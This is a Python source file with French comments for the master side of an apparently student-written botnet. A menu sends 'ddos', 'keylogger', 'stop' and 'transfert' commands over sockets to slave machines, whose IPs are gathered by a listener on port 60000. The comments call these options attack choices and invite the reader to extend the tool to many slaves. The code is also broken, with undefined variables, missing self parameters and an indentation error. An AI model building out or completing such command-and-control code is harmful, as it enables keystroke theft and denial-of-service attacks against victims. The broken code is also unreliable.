#importation du module socket afin de permetttre une communication réseau
#importation  d'argparse afin de pouvoir créer des argument
import socket as modSocket
import argparse

"""
création de l'objet communication
avec le champ machineEsclave.
Création de 2 méthodes connexion et argument

connexion() va permettre d'établire une connexion avec
une machine esclave
dans le try: on essaiera d'établire une connexion
avec une machine distante.
le except: va print "erreur" si il n'y a pas eu de
connexion

"""
class Communication():

    def __init__(self, machineEsclave, s):
        self.machineEsclave = machineEsclave
        self.s = s

    def connexion(self, machineEsclave, s):        
        try:
            s.connect(machineEsclave)
            print("Connecion établi avec l'esclave")
        except ConnectionRefusedError:
            print("Erreur de connexion")
           
    def master_listen():
        #création du socket pour que le master écoute sur un port afin de récupérer les adresses IP
        master_listen = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
        #écoute sur toutes les adresses disponibles sur la machine et sur le port 60 000
        master_listen.bind(("", 60000))
        #une fois connecté, on le met en écoute afin qu'il reçoive l'IP du slave; l'IP sera contenue dans addr
        master_listen. listen()
        #afin de recevoir l'IP, on accepte de recevoir des données, puis on stocke l'IP récupérée dans une liste
        distant_socket, addr = master_listen.accept()
        liste_adresses_ip = []
        liste_adresses_ip.append(addr[0])
        return liste_adresses_ip
    
    def master_sendMessages(liste_adresses_ip):
        # création du socket pour que le master envoie des messages au slave
        master_sendMessages = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
        # on définit les coordonnées sur lesquelles le master va envoyer ses instructions
        for adresse in liste_adresses_ip:
        slave_addr = (adresse, 60000)
        master_sendMessages.connect(slave_addr)

"""
création de l'objet ChoixAction
avec le champ machineEsclave et s.

machineEsclave, va contenire l'adresse et le port sur lequel on va essayer de se connecter.
(petit défi pour toi. Si tu veux, essaye de faire en sorte que machineEsclave soit une liste avec plusieurs IP(differents esclaves)
et fais une boucle qui va permettre de se connecter a tous ces clients. )
s va contenire les infos sur le type de communication ect ...

Création de pusieurs methodes afin de choisir l'action a faire
sur le slave.
Ils vont tous avoir la même action a faire c'est à dire envoyer un message au client
pour activer une action.
"""

class ChoixAction(Communication):

    def __init__(self, machineEsclave):
        self.machineEsclave = machineEsclave
        self.s = s
    
    def start_log(self, s):
        print("Choix d'attaque : Keylogger. Signal envoyé")
        #envoie keylogger au client 
        s.send("keylogger".encode("utf-8"))
        #reçois directement sa réponse
        print(s.recv(1024).decode("utf-8"))

    def ddos(self, s):
        #idem
        print("Choix d'attaque : DDoS. Signal envoyé")
        s.send("ddos".encode("utf-8"))
        print(s.recv(1024).decode("utf-8"))
    
    def stop_log(self, s):
        #idem
        print("Choix d'attaque : stop keylogger. Signal envoyé")
        s.send("stop".encode("utf-8"))
        print(s.recv(1024).decode("utf-8"))
    
    def  get_log(self, s):
        #idem
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        s.send("transfert".encode("utf-8"))
        print(s.recv(1024).decode("utf-8"))
        

#petit choix multiple afin de savoir quelle methode on doit lancer
select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
while select != 5:
    #on essaie le choix multiple
    try:
        if select == 1:
            #lance la methode ddos de l'objet choixAction
            a.ddos(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        elif select == 2:
            #lance la methode start de l'objet choixAction
            a.start_log(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        elif select == 3:
            #lance la methode stop de l'objet choixAction
            a.stop_log(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        elif select == 4:
            #lance la methode get de l'objet choixAction
            a.get_log(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))

    #si la connexion est arretée par le client pendant le choix multiple, il affichera le message ci dessous
    except ConnectionAbortedError:
        print("connexion arretée par le client")


"""
Pour rendre le code plus cool ont pourrait rajouter des arguments grace
au module argparse, on essaiera de mettre ça en place pour afficher par exemple les adresse avec
lesquels il sera connecter ect .......
À voir ce n'est pas urgent

"""

s.close()






    




